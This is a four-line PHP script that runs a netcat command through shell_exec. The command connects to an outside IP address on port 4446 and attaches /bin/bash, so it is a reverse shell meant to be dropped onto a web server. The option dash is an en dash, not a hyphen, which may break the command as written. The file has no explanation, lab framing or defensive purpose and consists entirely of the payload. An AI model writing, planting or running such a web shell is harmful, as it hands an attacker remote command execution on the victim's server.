<?php
$output = shell_exec('nc 70.123.5.62 4446 –e /bin/bash');
echo "<pre>$output</pre>";
?>
